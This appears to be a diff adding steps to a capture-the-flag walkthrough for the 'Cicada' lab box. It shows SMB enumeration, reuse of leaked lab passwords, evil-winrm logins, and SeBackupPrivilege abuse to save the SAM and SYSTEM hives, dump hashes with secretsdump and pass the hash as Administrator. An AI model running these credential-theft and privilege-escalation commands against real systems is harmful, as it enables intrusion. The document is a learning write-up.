@@ -77,6 +77,79 @@ We can see that the password worked for the user michael.wrightson.
 Next we can check what access Michael has to the available SMB shares.
 
 ```
-smbmap -H 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
+smbmap -H <target IP> -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
 ```
 
+![smbMap](Images/smbMap.png)
+
+
+Checking the READ ONLY shares we dont find anything of use.
+Next we can try enum4linux to try enumerate more information. Reference: https://github.com/CiscoCXSecurity/enum4linux
+
+```
+enum4linux  -a -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' <target IP>
+```
+![enum4](Images/enum4.png)
+
+Luckily, a user has left his password in his account details.
+We can try smbmap again with the new credentials.
+
+```
+smbmap -H <target IP> 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
+```
+Now we can see that we have access to the DEV share.
+
+![smbMap2](Images/smbMap2.png)
+
+Access the DEV share using smbclient.
+
+```
+smbclient //<target IP>/DEV -U 'david.orelious'
+```
+
+![smbClient2](Images/smbClient2.png)
+
+We can get the file Backup_script.ps1 and then read it locally on our attacking machine.
+The script contains another set of credentials in plaintext.
+
+![backupScript](Images/backupScript.png)
+
+## User Flag
+Try and use evil-winrm with the new user credentials. This works and we can find the flag on the users desktop.
+
+```
+evil-winrm -i <target IP> -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
+```
+
+![userFlag](Images/userFlag.png)
+
+## Privilege Escalation and Root Flag
+We can enumerate the current privileges of the logged in user using the below commnad.
+```
+whoami /priv
+```
+
+![regSave](Images/regSave.png)
+
+We see that SeBackupPrivilege is Enabled. This can be used to escalate our privileges. Reference: https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md
+
+```
+reg save hklm\sam sam
+reg save hklm\system system
+download sam
+download system
+```
+
+Then, we can use impack-secretsdump to dump the sam hashes. With this we can use evil-winrm to pass the hash and connect as Local Admin.
+From here, navigate to the Desktop to retrieve the root flag.
+
+```
+impacket-secretsdump LOCAL -system system -sam sam
+evil-winrm -i <target IP> -u 'Administrator' -H '<hash>'
+```
+
+![adminHash](Images/adminHash.png)
+
+Congratulations Cicada has been successfully Pwned!
+
+![pwned](Images/pwned.png)
